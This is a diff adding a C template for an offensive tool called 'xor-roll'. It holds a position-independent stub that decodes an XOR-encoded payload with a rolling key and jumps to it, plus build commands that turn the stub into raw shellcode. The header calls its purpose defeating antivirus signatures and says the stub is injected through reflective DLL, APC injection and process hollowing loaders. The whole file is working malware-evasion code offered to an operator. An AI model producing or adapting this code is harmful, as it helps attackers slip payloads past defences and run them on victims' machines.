@@ -1,0 +1,38 @@
+/* xor_decoder.c.j2 — reference template for `xor-roll`
+ *
+ * Minimal position-independent XOR decoder stub + payload dispatch.
+ * Decodes an inline-encoded payload with a rolling multi-byte key,
+ * then jumps to it. Signature-defeat only — doesn't provide any
+ * runtime protection.
+ *
+ * Operator substitutes:
+ *   {{key_bytes}}      — the rolling key (array of bytes, 4-8 bytes typical)
+ *   {{payload_bytes}}  — XOR-encoded payload (encoded attacker-side)
+ *   {{payload_size}}   — size of payload in bytes
+ *
+ * Build:
+ *   gcc -fPIC -nostdlib -o decoder.o -c xor_decoder.c
+ *   objcopy -O binary --only-section=.text decoder.o decoder.bin
+ *
+ * The resulting decoder.bin is injected via any of the loader
+ * templates (reflective_dll, apc-injection, process-hollowing). */
+
+#include <stdint.h>
+
+static const uint8_t KEY[] = {{key_bytes}};
+static uint8_t PAYLOAD[] = {{payload_bytes}};
+
+/* Entry point — called by the host loader (shellcode start). */
+void _start(void) {
+    const unsigned keylen = sizeof(KEY);
+    const unsigned payloadlen = {{payload_size}};
+
+    for (unsigned i = 0; i < payloadlen; ++i) {
+        PAYLOAD[i] ^= KEY[i % keylen];
+    }
+
+    /* Jump to the decoded payload. The payload is itself position-
+     * independent + begins with its own entry stub. */
+    void (*go)(void) = (void (*)(void)) PAYLOAD;
+    go();
+}
